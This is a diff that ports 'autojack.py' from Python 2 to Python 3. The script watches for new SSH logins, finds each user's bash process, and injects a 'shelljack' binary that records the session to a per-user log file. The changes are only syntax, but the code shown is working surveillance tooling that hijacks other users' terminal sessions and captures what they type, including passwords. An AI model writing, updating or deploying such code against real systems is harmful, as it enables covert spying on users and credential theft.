@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 """
     autojack.py
@@ -39,7 +39,7 @@ while True:
 
         p = subprocess.Popen(["pgrep", "-P", m.group(1), "-l"], stdout=subprocess.PIPE)
         stdout, stderr = p.communicate()
-        out = stdout.split("\n")
+        out = stdout.decode().split("\n")
 
         i = 0
         while i < len(out):
@@ -48,21 +48,20 @@ while True:
                 i += 1
                 continue
             if child_process[1] == "bash":
-                print "Found a new bash process with PID %s for user %s! Injecting shelljack... " % (child_process[0], m.group(2)),
+                print("Found a new bash process with PID %s for user %s! Injecting shelljack... " % (child_process[0], m.group(2)), end=' ')
                 subprocess.call([SHELLJACK_BINARY, "-f", LOGFILE % (m.group(2), int(time.time())), child_process[0]])
-                print "Done!"
+                print("Done!")
                 break
             # An additional child sshd process may contain the bash reference.
             elif child_process[1] == "sshd":
                 p2 = subprocess.Popen(["pgrep", "-P", child_process[0], "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout2, stderr2 = p2.communicate()
-                out.extend(stdout2.split('\n'))
+                out.extend(stdout2.decode().split('\n'))
             i += 1
 
     elif not line:
         try:
             time.sleep(1)
         except KeyboardInterrupt:
-            print "\rBye!"
+            print("\rBye!")
             break
-
